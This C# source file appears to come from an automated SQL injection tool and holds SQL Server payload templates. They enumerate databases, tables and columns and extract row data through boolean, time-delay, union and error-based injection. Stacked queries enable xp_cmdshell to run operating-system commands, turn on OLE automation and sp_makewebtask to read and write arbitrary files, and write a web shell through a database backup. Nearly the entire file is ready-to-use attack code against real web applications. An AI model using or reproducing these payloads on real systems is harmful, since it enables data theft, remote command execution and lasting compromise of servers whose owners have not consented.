using System;
using System.Collections.Generic;
using System.Text;
using tools;

namespace SuperSQLInjection.payload
{
    class SQLServer
    {
        //加载对应配置(需要读取的环境变量)
        public static String path = "config/vers/sqlserver.txt";
        public static List<String> vers = FileTool.readFileToList(path);


        //数据库数量
        public static String dbs_count = "(select count(1) from [master]..[sysdatabases])";
        //表数量
        public static String tables_count = "(select count(1) from [{dbname}]..[sysobjects] where xtype=0x55)";
        //列数量
        public static String columns_count = "(select count(1) from [{dbname}]..[syscolumns] where id=object_id('{dbname}..{table}'))";
        //获取数据条数
        public static String data_count = "(select count(1) from [{dbname}]..[{table}])";


        //获取数据库名
        public static String db_value = "(select (select top 1 name from (select top {index} name from [master]..[sysdatabases] order by name) t order by t.name desc))";
        //获取表名称
        public static String table_value = "(select (select top 1 name from [{dbname}]..[sysobjects] where xtype=0x55 and id not in (select top {index} id from [{dbname}]..[sysobjects] where xtype=0x55)))";
        //获取列名称
        public static String column_value = "(select (select top 1 name from [{dbname}]..[syscolumns] where id=object_id('{dbname}..{table}') and colid not in (select top {index} colid from [{dbname}]..[syscolumns] where id=object_id('{dbname}..{table}'))))";


        //获取数据库数量bool方式
        public static String bool_db_count = " " + dbs_count + ">{len}";
        //获取表数量bool
        public static String bool_tables_count = " " + tables_count + ">{len}";
        //获取列数量bool
        public static String bool_columns_count = " " + columns_count + ">{len}";

        public static String bool_datas_count = " " + data_count + ">={len}";

        //多字符
        public static String unicode_value = "cast(unicode(substring({data},{index},1)) as varchar(100))";
        public static String nocast_unicode_value = "unicode(substring({data},{index},1))";
       

        public static String substr = "substring(({data}),{index},1)";
        public static String substr_value = "substring(({data}),{index},{len})";

        //bool方式字符长度判断
        public static String bool_length = " len({data})>{len}";
        public static String bool_dataLength = " datalength({data})>{len}";
        public static String bool_value = " {data}>{len}";
        public static String check_li_value = " len({data})<{len}";

        //bool方式获取值

        //每个unicode值范围0-9
        public static String bool_unicode_value = " (substring({data},{index},1))>{len}";

        //获取行数据bool方式
        public static String data_value_bool = "(select top 1 {data} from (select top {index} * from [{dbname}]..[{table}] order by {orderby}) t order by {orderby} desc)";

        //解决存在text，BINARY等多种数据类型时，存在空值，sql报错无法获取数据的问题
        public static String data_value = "(select top 1 {data} from (select top {index} * from [{dbname}]..[{table}] order by {orderby}) t order by {orderby} desc for xml raw,binary base64)";
        


        //union获取值
        public static String union_value = " 1=2 union all select {data}";

        //error方式
        public static String error_value = " convert(int,(char(94)+char(94)+char(33)+cast({data} as varchar(2000))+char(33)+char(94)+char(94)))=1";


        //cmd
        public static String createTableAndExecCmd = " 1=1;create table ssqlinjection(id int primary key identity,data varchar(8000));exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;declare @cmd varchar(8000);set @cmd={cmd};insert into ssqlinjection(data) exec [master]..[xp_cmdshell] @cmd;select 1 where 1=1 ";
        public static String cmdData = "cast((select top 1 data from ssqlinjection where id={index}) as varchar(8000))";
        public static String cmdDataCount = "(select (select count(1) from ssqlinjection))";
        public static String dropTable = " 1=1;drop table ssqlinjection;select 1 where 1=1 ";

        public static String dropWriteFileBackUpTableAndDropDB = " 1=1;drop table [ssqlinjection]..[data];drop database ssqlinjection;select 1 where 1=1 ";

        public static String createWriteFileBackUpTable = " 1=1;create table [ssqlinjection]..[data] (content image);select 1 where 1=1 ";

        public static String createWriteFileBackUpDB = " 1=1;create database ssqlinjection;select 1 where 1=1 ";


        //文件读写
        public static String witeFileByFileSystemObject = " 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',1;reconfigure;declare @object int;declare @file int;declare @data varchar(8000);set @data={data};declare @path varchar(4000);set @path={path};exec [master]..[sp_oacreate] 'scripting.fileSystemObject',@object out;exec [master]..[sp_oamethod] @object,'createtextfile',@file output,@path;exec [master]..[sp_oamethod] @file,'write',null,@data;exec [master]..[sp_oamethod] @file,'close',null;select 1 where 1=1 ";
        public static String witeFileBySP_MakeWebTask = " 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'web assistant procedures',1;reconfigure;declare @d varchar(8000);set @d={data};declare @p varchar(4000);set @p={path};exec sp_makewebtask @p, @d;select 1 where 1=1 ";
        public static String witeFileByBackDataBase = " 1=1;insert into [ssqlinjection]..[data](content) values({data});declare @s varchar(8000);set @s={path} backup database ssqlinjection to disk=@s;select 1 where 1=1 ";
        public static String readFileByFileSystemobject = " 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',1;reconfigure;declare @object int;declare @file int;declare @data varchar(8000);exec [master]..[sp_oacreate] 'scripting.filesystemobject',@object out;exec [master]..[sp_oamethod] @object,'OpenTextFile',@file output,'{path}';create table ssqlinjection (data varchar(8000));exec [master]..[sp_oamethod] @file,'read',@data out,8000;insert into ssqlinjection(data) values(@data);select 1 where 1=1 ";

        //读文件的的payload
        public static String file_content = "(select data from ssqlinjection)";

        public static String getBoolDataBySleep(String data, int maxTime)
        {
            return " if(" + data + ") waitfor delay '0:0:" + maxTime + "'";
        }

        /// <summary>
        /// 获取union的payload
        /// </summary>
        /// <param name="columnsLen">列长</param>
        /// <param name="showIndex">显示列</param>
        /// <param name="Fill">填充</param>
        /// <param name="dbname">数据库名</param>
        /// <param name="table">表名</param>
        /// <param name="column">获取数据的字段</param>
        /// <param name="index">第几行数据，1开始</param>
        public static String getUnionDataValue(int columnsLen,int showIndex,String Fill,String dbname,String table,List<String> columns,int index)
        {
            StringBuilder sb = new StringBuilder();
            String data = data_value.Replace("{data}", Comm.unionColumns(columns,",")).Replace("{orderby}", columns[0]);
            for (int i = 1; i <= columnsLen; i++)
            {

                if (i == showIndex)
                {
                    String d = data.Replace("{dbname}", dbname).Replace("{table}", table).Replace("{index}", index.ToString());
                    sb.Append("(char(94)+char(94)+char(33)+" +d+ "+char(33)+char(94)+char(94)),");
                }
                else
                {

                    sb.Append(Fill + ",");
                }
            }
            sb.Remove(sb.Length - 1, 1);
            return union_value.Replace("{data}", sb.ToString());
        }

        /// <summary>
        /// </summary>
        /// <param name="columnsLen">列长</param>
        /// <param name="showIndex">显示列</param>
        /// <param name="Fill">填充</param>
        /// <param name="dataPayLoad">值payload</param>
        /// <returns></returns>
        public static String getUnionDataValue(int columnsLen, int showIndex, String Fill,String dataPayLoad)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 1; i <= columnsLen; i++)
            {
                if (i == showIndex)
                {
                    sb.Append("(char(94)+char(94)+char(33)+" + "cast(" + dataPayLoad + " as varchar(8000))+char(33)+char(94)+char(94)),");
                }
                else
                {
                    sb.Append(Fill + ",");
                }
            }
            sb.Remove(sb.Length - 1, 1);
            return union_value.Replace("{data}", sb.ToString());
        }

        public static String getUnionDataValueByCMD(int columnsLen, int showIndex, String Fill, String dataPayLoad)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 1; i <= columnsLen; i++)
            {
                if (i == showIndex)
                {
                    sb.Append("(char(94)+char(94)+char(33)+cast(" + (dataPayLoad) + " as varchar(8000))+char(33)+char(94)+char(94)),");
                }
                else
                {
                    sb.Append(Fill+",");
                }
            }
            sb.Remove(sb.Length - 1, 1);
            return union_value.Replace("{data}", sb.ToString());
        }

        /// <summary>
        /// 获取数据，error
        /// </summary>
        /// <param name="columnsLen">列长</param>
        /// <param name="showIndex">显示列</param>
        /// <param name="Fill">填充</param>
        /// <param name="dataPayLoad"></param>
        /// <param name="dbname">数据库名</param>
        /// <param name="table">表名</param>
        /// <param name="index">第几行数据，1开始</param>
        /// <returns></returns>
        public static String getUnionDataValue(int columnsLen, int showIndex, String Fill, String dataPayLoad,String dbname,String table,String index)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 1; i <= columnsLen; i++)
            {
                if (i == showIndex)
                {
                    sb.Append("(char(94)+char(94)+char(33)+" + (("cast(" + dataPayLoad + " as varchar(5000))").Replace("{dbname}", dbname).Replace("{table}", table).Replace("{index}", index)) + "+char(33)+char(94)+char(94)),");
                }
                else
                {
                    sb.Append(Fill + ",");
                }
            }
            sb.Remove(sb.Length - 1, 1);
            return union_value.Replace("{data}", sb.ToString());
        }


        /// <summary>
        /// 
        /// </summary>
        /// <param name="columnsLen">列长</param>
        /// <param name="showIndex">显示列</param>
        /// <param name="Fill">填充</param>
        /// <param name="dbname">数据库名</param>
        /// <param name="table">表名</param>
        /// <param name="column">获取数据的字段</param>
        /// <param name="index">第几行数据，1开始</param>
        public static String getErrorDataValue(String dbname, String table,int index,List<String> columns)
        {
            String data = data_value.Replace("{data}", concatAllColumnsByConcatStr(columns)).Replace("{allcolumns}", concatAllColumns(columns)).Replace("{orderby}", columns[0]);
            String d = data.Replace("{dbname}", dbname).Replace("{table}", table).Replace("{column}", concatAllColumnsByConcatStr(columns)).Replace("{index}", index.ToString());
            return error_value.Replace("{data}", d);
        }

        /// <summary>
        /// 多字段拼接
        /// </summary>
        /// <param name="columns"></param>
        /// <returns></returns>
        public static String concatAllColumns(List<String> columns)
        {
            StringBuilder sb = new StringBuilder();
            foreach (String column in columns)
            {
                sb.Append(column);
                sb.Append(",");
            }
            sb.Remove(sb.Length - 1, 1);
            return sb.ToString();
        }
        /// <summary>
        /// 多字段拼接，带连接符
        /// </summary>
        /// <param name="columns"></param>
        /// <returns></returns>
        public static String concatAllColumnsByConcatStr(List<String> columns)
        {
            StringBuilder sb = new StringBuilder();
            foreach (String column in columns)
            {

                sb.Append("cast(isnull(" + column + ",space(1)) as varchar(5000))+char(36)+char(36)+char(36)+");
            }
            sb.Remove(sb.Length - 28, 28);
            return sb.ToString();
        }

        /// <summary>
        /// 获得bool方式值payload
        /// </summary>
        /// <param name="dataStr">对应值的查询SQL</param>
        /// <param name="dbName">数据库名</param>
        /// <param name="table">表名</param>
        /// <param name="index">下标</param>
        /// <returns></returns>
        public static String getBoolDataPayLoad(String column,List<String> columns,String dbName,String table,int index)
        {
            String data = data_value_bool.Replace("{data}", "cast(isnull("+column+ ",space(1)) as varchar)").Replace("{allcolumns}", concatAllColumns(columns)).Replace("{orderby}", columns[0]);
            String payload = data.Replace("{dbname}", dbName).Replace("{table}", table).Replace("{index}", index.ToString());
            return payload;
        }

        /// <summary>
        /// 反射条调用，加载显示支持的文件操作
        /// </summary>
        /// <returns></returns>
        public static List<String> getShowCanDoFile()
        {
            List<String> list = new List<String>();
            list.Add("SQLServer FileSystemObject写文件");
            list.Add("SQLServer Sp_MakeWebTask写文件");
            list.Add("SQLServer 备份写WebShell(有多余数据)");
            list.Add("SQLServer FileSystemObject读文件");
            return list;     
        }
    }
}
